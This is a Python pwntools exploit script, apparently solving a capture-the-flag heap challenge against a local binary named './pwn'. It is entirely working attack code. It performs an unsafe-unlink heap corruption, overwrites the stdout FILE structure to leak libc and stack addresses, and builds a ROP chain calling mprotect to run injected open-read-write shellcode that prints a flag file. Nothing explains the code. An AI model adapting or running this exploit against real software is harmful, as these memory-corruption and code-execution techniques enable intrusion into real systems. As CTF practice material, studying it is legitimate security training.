from pwn import *
#context(arch = 'amd64', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
        gdb.attach(io)
        pause()

sd   = lambda s    : io.send(s)
sda  = lambda s, n : io.sendafter(s, n)
sl   = lambda s    : io.sendline(s)
sla  = lambda s, n : io.sendlineafter(s, n)
rc   = lambda n    : io.recv(n)
rut  = lambda s    : io.recvuntil(s, drop=True)
ruf  = lambda s    : io.recvuntil(s, drop=False)
addr = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
byte = lambda n    : str(n).encode()
sh   = lambda      : io.interactive()

menu = b'4.copy\n>\n'
def add(size, content):
	sla(menu, b'1')
	sla(b'size:\n', byte(size))
	sda(b'buf:\n', content)

def dele(idx):
	sla(menu, b'2')
	sla(b'index:\n', byte(idx))

def edit(idx, size, content):
	sla(menu, b'3')
	sla(b'index:\n', byte(idx))
	sla(b'size:\n', byte(size))
	sda(b'buf:\n', content)

def copy(sour, dest, length):
	sla(menu, b'4')
	sla(b'index:\n', byte(sour))
	sla(b'index:\n', byte(dest))
	sla(b'length:\n', byte(length))

shellcode_addr = elf.bss() + 0x200
flag_str = elf.bss() + 0x300
flag = elf.bss() + 0x320
chunk = 0x6021A0
bss_stdout = 0x602180
fd = chunk - 0x18
bk = chunk - 0x10
pop_rdi = 0x0000000000400ca3 #: pop rdi ; ret
libc_pop_rsi = 0x00000000000202f8 #: pop rsi ; ret
libc_pop_rdx = 0x0000000000001b92 #: pop rdx ; ret
libc_pop_rdx_rsi = 0x00000000001151c9 #: pop rdx ; pop rsi ; ret

add(0x80, b'0\n')
add(0x80, b'1\n')
add(0x80, b'2\n')

payload  = p64(0) + p64(0x81) + p64(fd) + p64(bk)
payload  = payload.ljust(0x80, b'\x00')
payload += p64(0x80) + p64(0x90)
edit(0, len(payload), payload)
dele(1)

payload = b'A'*0x18 + p64(chunk)*2 + p64(bss_stdout) + p64(shellcode_addr)
edit(0, len(payload), payload)
copy(2, 1, 8)

payload = p64(0xfbad3887) + p64(0)*3 + b'\x40'
edit(0, len(payload), payload)

libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x3c5640
mprotect = libc.symbols['mprotect']
environ_addr = libc.symbols['environ']
print("libc_base     : ", hex(libc.address))
print("mprotect_addr : ", hex(mprotect))
print("environ_addr  : ", hex(environ_addr))

payload = p64(0xfbad3887) + p64(0)*3 + p64(environ_addr) + p64(environ_addr+8)
edit(0, len(payload), payload)
environ = u64(io.recv(6).ljust(8, b'\x00'))
ret_addr = environ - 0xf0
print("environ  : ", hex(environ))
print("ret_addr : ", hex(ret_addr))

shellcode = '''
	mov eax, 5
	mov ebx, {0}
	mov ecx, 0
	int 0x80
	
	mov ebx, eax
	mov ecx, {1}
	mov edx, 0x30
	mov eax, 3
	int 0x80

	mov eax, 4
	mov ebx, 1
	int 0x80
'''.format(flag_str, flag)

orw = asm(shellcode, arch = 'i386', os = 'linux')
print(orw)

edit(1, 8, p64(flag_str))
edit(0, 4, b'flag')

edit(1, 8, p64(shellcode_addr))
edit(0, len(orw), orw)

libc_pop_rsi += libc.address
libc_pop_rdx += libc.address
libc_pop_rdx_rsi += libc.address
payload  = p64(pop_rdi) + p64(0x602000) 
payload += p64(libc_pop_rdx_rsi) + p64(7) + p64(0x1000) 
payload += p64(mprotect) + p64(shellcode_addr)

debug()
edit(1, 8, p64(ret_addr))
edit(0, len(payload), payload)
sla(menu, b'5')
#debug()
sh()
